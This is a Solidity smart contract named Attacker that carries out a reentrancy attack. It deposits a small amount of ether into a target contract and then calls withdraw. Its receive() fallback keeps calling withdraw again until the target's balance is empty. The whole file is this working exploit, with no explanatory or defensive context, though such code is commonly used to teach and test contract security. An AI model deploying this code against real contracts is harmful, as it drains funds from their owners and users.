interface ITarget {
    function deposit() external payable;

    function withdraw() external;
}

contract Attacker {
    address private _target;

    constructor(address target) payable {
        _target = target;
    }

    function attack() external payable {
        ITarget(_target).deposit{value: 0.001 ether}();
        ITarget(_target).withdraw();
    }

    receive() external payable {
        if (address(_target).balance != 0) {
            ITarget(_target).withdraw();
        }
    }
}
